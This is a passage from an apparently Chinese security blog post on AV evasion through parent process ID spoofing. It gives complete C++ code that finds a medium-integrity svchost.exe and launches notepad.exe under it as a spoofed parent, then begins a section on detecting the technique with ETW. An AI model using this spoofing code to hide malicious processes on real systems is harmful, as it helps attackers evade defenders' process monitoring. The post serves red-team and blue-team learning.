class="line">            <span class="comment">// 当进程运行于Windows Vista之前的系统中，GetTokenInformation返回</span></span><br><span class="line">            <span class="comment">// FALSE和错误码ERROR_INVALID_PARAMETER。这是由于这些操作系统不支</span></span><br><span class="line">            <span class="comment">// 持TokenElevation。</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;[!] GetTokenInformation no support !&quot;</span> &lt;&lt; endl;</span><br><span class="line">            dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line">            <span class="keyword">goto</span> Cleanup;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们为完整性级别信息分配一个缓存。</span></span><br><span class="line">    pTokenIL = (TOKEN_MANDATORY_LABEL*)<span class="built_in">LocalAlloc</span>(LPTR, cbTokenIL);</span><br><span class="line">    <span class="keyword">if</span> (pTokenIL == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] pTokenIL is null&quot;</span> &lt;&lt; endl;</span><br><span class="line">        dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">goto</span> Cleanup;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得令牌完整性级别信息。</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">GetTokenInformation</span>(hToken, TokenIntegrityLevel, pTokenIL,</span><br><span class="line">        cbTokenIL, &amp;cbTokenIL))</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] GetTokenInformation error !&quot;</span> &lt;&lt; endl;</span><br><span class="line">        dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">goto</span> Cleanup;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 完整性级别SID为S-1-16-0xXXXX形式。（例如：S-1-16-0x1000表示为低完整性</span></span><br><span class="line">    <span class="comment">// 级别的SID）。而且有且仅有一个次级授权信息。</span></span><br><span class="line">    *pdwIntegrityLevel = *<span class="built_in">GetSidSubAuthority</span>(pTokenIL-&gt;Label.Sid, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Cleanup:</span><br><span class="line">    <span class="comment">// 集中清理所有已分配的内存资源</span></span><br><span class="line">    <span class="keyword">if</span> (hToken)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        hToken = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pTokenIL)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">LocalFree</span>(pTokenIL);</span><br><span class="line">        pTokenIL = <span class="literal">NULL</span>;</span><br><span class="line">        cbTokenIL = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ERROR_SUCCESS != dwError)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 失败时确保此能够获取此错误代码</span></span><br><span class="line">        <span class="built_in">SetLastError</span>(dwError);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;ERROR&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*pdwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">L&quot;LOW&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*pdwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp; *pdwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">L&quot;MEDIUM&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*pdwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">L&quot;HIGH&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*pdwIntegrityLevel &gt;= SECURITY_MANDATORY_SYSTEM_RID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">L&quot;SYSTEM&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>错误提示主要依靠函数<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>，当然它只返回一个errorcode，还需要用<code>FormatMessage</code>转换成字符串。</p>
<p>具体代码如下：</p>
<blockquote>
<p>代码来自于 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34227896/article/details/86699941">https://blog.csdn.net/qq_34227896/article/details/86699941</a></p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">get_last_error</span><span class="params">(DWORD errCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">string <span class="title">err</span><span class="params">(<span class="string">&quot;&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (errCode == <span class="number">0</span>) errCode = <span class="built_in">GetLastError</span>();</span><br><span class="line">    LPTSTR lpBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">FormatMessage</span>(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, <span class="comment">//标志位，决定如何说明lpSource参数，dwFlags的低位指定如何处理换行功能在输出缓冲区，也决定最大宽度的格式化输出行,可选参数。</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//根据dwFlags标志而定。</span></span><br><span class="line">        errCode,<span class="comment">//请求的消息的标识符。当dwFlags标志为FORMAT_MESSAGE_FROM_STRING时会被忽略。</span></span><br><span class="line">        <span class="built_in">MAKELANGID</span>(LANG_NEUTRAL, SUBLANG_DEFAULT),<span class="comment">//请求的消息的语言标识符。</span></span><br><span class="line">        (LPTSTR)&amp;lpBuffer,<span class="comment">//接收错误信息描述的缓冲区指针。</span></span><br><span class="line">        <span class="number">0</span>,<span class="comment">//如果FORMAT_MESSAGE_ALLOCATE_BUFFER标志没有被指定，这个参数必须指定为输出缓冲区的大小，如果指定值为0，这个参数指定为分配给输出缓冲区的最小数。</span></span><br><span class="line">        <span class="literal">NULL</span><span class="comment">//保存格式化信息中的插入值的一个数组。</span></span><br><span class="line">    ))</span><br><span class="line">    &#123;<span class="comment">//失败</span></span><br><span class="line">        <span class="type">char</span> tmp[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">sprintf_s</span>(tmp, <span class="string">&quot;&#123;未定义错误描述(%d)&#125;&quot;</span>, errCode);</span><br><span class="line">        err = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//成功</span></span><br><span class="line">    &#123;</span><br><span class="line">        USES_CONVERSION;</span><br><span class="line">        err = <span class="built_in">W2A</span>(lpBuffer);</span><br><span class="line">        <span class="built_in">LocalFree</span>(lpBuffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再对<code>getPPID</code>进行简单的修改，如果<code>getProcessIntegrityLevel</code>返回的是 ERROR，则跳过，直到返回 MEDIUM。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-e44187416abfd4adb6f59f7eeade6fc85bf5589d.png)</p>
<p>现在代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atlconv.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">get_last_error</span><span class="params">(DWORD errCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">string <span class="title">err</span><span class="params">(<span class="string">&quot;&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (errCode == <span class="number">0</span>) errCode = <span class="built_in">GetLastError</span>();</span><br><span class="line">    LPTSTR lpBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">FormatMessage</span>(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, <span class="comment">//标志位，决定如何说明lpSource参数，dwFlags的低位指定如何处理换行功能在输出缓冲区，也决定最大宽度的格式化输出行,可选参数。</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">//根据dwFlags标志而定。</span></span><br><span class="line">        errCode,<span class="comment">//请求的消息的标识符。当dwFlags标志为FORMAT_MESSAGE_FROM_STRING时会被忽略。</span></span><br><span class="line">        <span class="built_in">MAKELANGID</span>(LANG_NEUTRAL, SUBLANG_DEFAULT),<span class="comment">//请求的消息的语言标识符。</span></span><br><span class="line">        (LPTSTR)&amp;lpBuffer,<span class="comment">//接收错误信息描述的缓冲区指针。</span></span><br><span class="line">        <span class="number">0</span>,<span class="comment">//如果FORMAT_MESSAGE_ALLOCATE_BUFFER标志没有被指定，这个参数必须指定为输出缓冲区的大小，如果指定值为0，这个参数指定为分配给输出缓冲区的最小数。</span></span><br><span class="line">        <span class="literal">NULL</span><span class="comment">//保存格式化信息中的插入值的一个数组。</span></span><br><span class="line">    ))</span><br><span class="line">    &#123;<span class="comment">//失败</span></span><br><span class="line">        <span class="type">char</span> tmp[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">sprintf_s</span>(tmp, <span class="string">&quot;&#123;未定义错误描述(%d)&#125;&quot;</span>, errCode);</span><br><span class="line">        err = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//成功</span></span><br><span class="line">    &#123;</span><br><span class="line">        USES_CONVERSION;</span><br><span class="line">        err = <span class="built_in">W2A</span>(lpBuffer);</span><br><span class="line">        <span class="built_in">LocalFree</span>(lpBuffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LPCWSTR <span class="title">getProcessIntegrityLevel</span><span class="params">(HANDLE hProcess, PDWORD pdwIntegrityLevel)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwError = ERROR_SUCCESS;</span><br><span class="line">    HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD cbTokenIL = <span class="number">0</span>;</span><br><span class="line">    PTOKEN_MANDATORY_LABEL pTokenIL = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pdwIntegrityLevel == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = ERROR_INVALID_PARAMETER;</span><br><span class="line">        <span class="keyword">goto</span> Cleanup;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以TOKEN_QUERY开启此线程的主访问令牌。</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_QUERY, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] OpenProcessToken error!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">goto</span> Cleanup;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询令牌完整性级别信息的大小。注意：我们预期得到一个FALSE结果及错误</span></span><br><span class="line">    <span class="comment">// ERROR_INSUFFICIENT_BUFFER， 这是由于我们在GetTokenInformation输入一个</span></span><br><span class="line">    <span class="comment">// 空缓冲。同时，在cbTokenIL中我们会得知完整性级别信息的大小。</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">GetTokenInformation</span>(hToken, TokenIntegrityLevel, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;cbTokenIL))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ERROR_INSUFFICIENT_BUFFER != <span class="built_in">GetLastError</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 当进程运行于Windows Vista之前的系统中，GetTokenInformation返回</span></span><br><span class="line">            <span class="comment">// FALSE和错误码ERROR_INVALID_PARAMETER。这是由于这些操作系统不支</span></span><br><span class="line">            <span class="comment">// 持TokenElevation。</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;[!] GetTokenInformation no support !&quot;</span> &lt;&lt; endl;</span><br><span class="line">            dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line">            <span class="keyword">goto</span> Cleanup;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们为完整性级别信息分配一个缓存。</span></span><br><span class="line">    pTokenIL = (TOKEN_MANDATORY_LABEL*)<span class="built_in">LocalAlloc</span>(LPTR, cbTokenIL);</span><br><span class="line">    <span class="keyword">if</span> (pTokenIL == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] pTokenIL is null&quot;</span> &lt;&lt; endl;</span><br><span class="line">        dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">goto</span> Cleanup;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得令牌完整性级别信息。</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">GetTokenInformation</span>(hToken, TokenIntegrityLevel, pTokenIL,</span><br><span class="line">        cbTokenIL, &amp;cbTokenIL))</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] GetTokenInformation error !&quot;</span> &lt;&lt; endl;</span><br><span class="line">        dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">goto</span> Cleanup;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 完整性级别SID为S-1-16-0xXXXX形式。（例如：S-1-16-0x1000表示为低完整性</span></span><br><span class="line">    <span class="comment">// 级别的SID）。而且有且仅有一个次级授权信息。</span></span><br><span class="line">    *pdwIntegrityLevel = *<span class="built_in">GetSidSubAuthority</span>(pTokenIL-&gt;Label.Sid, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Cleanup:</span><br><span class="line">    <span class="comment">// 集中清理所有已分配的内存资源</span></span><br><span class="line">    <span class="keyword">if</span> (hToken)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        hToken = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pTokenIL)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">LocalFree</span>(pTokenIL);</span><br><span class="line">        pTokenIL = <span class="literal">NULL</span>;</span><br><span class="line">        cbTokenIL = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ERROR_SUCCESS != dwError)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 失败时确保此能够获取此错误代码</span></span><br><span class="line">        <span class="built_in">SetLastError</span>(dwError);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;ERROR&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*pdwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">L&quot;LOW&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*pdwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp; *pdwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">L&quot;MEDIUM&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*pdwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">L&quot;HIGH&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*pdwIntegrityLevel &gt;= SECURITY_MANDATORY_SYSTEM_RID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">L&quot;SYSTEM&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">getPPID</span><span class="params">(LPCWSTR processName)</span> </span>&#123;</span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    process.dwSize = <span class="built_in">sizeof</span>(process);</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;process)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(process.szExeFile, processName)) &#123;</span><br><span class="line">                HANDLE hProcess = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);</span><br><span class="line">                <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">                    LPCWSTR integrityLevel = <span class="literal">NULL</span>;</span><br><span class="line">                    DWORD dwIntegrityLevel;</span><br><span class="line">                    integrityLevel = <span class="built_in">getProcessIntegrityLevel</span>(hProcess, &amp;dwIntegrityLevel);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(integrityLevel, <span class="string">L&quot;ERROR&quot;</span>)) &#123;</span><br><span class="line">                        cout &lt;&lt; <span class="string">&quot;[!] PID = &quot;</span> &lt;&lt; process.th32ProcessID &lt;&lt; <span class="string">&quot; GetProcessIntegrityLevel failed, Error: &quot;</span> &lt;&lt; <span class="built_in">get_last_error</span>(<span class="built_in">GetLastError</span>()) &lt;&lt; endl;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(integrityLevel, <span class="string">L&quot;MEDIUM&quot;</span>)) &#123;</span><br><span class="line">                        flag = <span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(snapshot, &amp;process));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">    <span class="comment">// 没有找到 MEDIUM 权限的进程</span></span><br><span class="line">    <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">        cout &lt;&lt; processName &lt;&lt; <span class="string">&quot; does have medium integrity level!!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    STARTUPINFOEXA si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    SIZE_T attributeSize;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line"></span><br><span class="line">    LPCWSTR parentProcess = <span class="string">L&quot;svchost.exe&quot;</span>;</span><br><span class="line">    DWORD parentPID = <span class="built_in">getPPID</span>(parentProcess);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Spoofing %ws (PID: %u) as the parent process.\n&quot;</span>, parentProcess, parentPID);</span><br><span class="line">    HANDLE parentProcessHandle = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, <span class="literal">false</span>, parentPID);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, attributeSize);</span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    <span class="built_in">UpdateProcThreadAttribute</span>(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="built_in">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    si.StartupInfo.cb = <span class="built_in">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line">    LPCWSTR spawnProcess = <span class="string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>;</span><br><span class="line">    <span class="built_in">CreateProcess</span>(spawnProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (STARTUPINFO*)&amp;si, &amp;pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Spawning %ws (PID: %u)\n&quot;</span>, spawnProcess, pi.dwProcessId);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次运行，可以看到，程序一开始尝试了pid 为 3868 的 svchost.exe，但是没有成功，提示“<strong>拒绝访问</strong>”，说明权限不够。然后尝试了 5964，成功了，在 Process Hacker 下也看到 notepad.exe 在 svchost.exe 了。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-d9e87caefaf6c1b8a1211d3cba0250d703491281.png)</p>
<h2 id="0x04-检测"><a href="#0x04-检测" class="headerlink" title="0x04 检测"></a>0x04 检测</h2><blockquote>
<p>检测方法来源：<a target="_blank" rel="noopener" href="https://blog.f-secure.com/detecting-parent-pid-spoofing/">https://blog.f-secure.com/detecting-parent-pid-spoofing/</a></p>
</blockquote>
<p>上面我们展示了如何进行 ppid 欺骗，如果你是蓝队的小伙伴，在受害主机上用任务管理器或者进程管理器之类的工具查看正在运行的进程，只能看到欺骗后的 ID，那有没有啥办法可以找出真实的 ID 呢？这里就需要用到 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/framework/wcf/samples/etw-tracing">ETW（Event Tracing for Windows）</a>了，它是 Windows 提供的原生的事件跟踪日志系统，说人话就是，ETW 就是用来记录 Windows 系统日志的一个机制。</p>
<h3 id="1-ETW-概念"><a href="#1-ETW-概念" class="headerlink" title="1. ETW 概念"></a>1. ETW 概念</h3><p>在开始使用之前，我们先来了解一下 ETW 相关的一些基本概念：</p>
<blockquote>
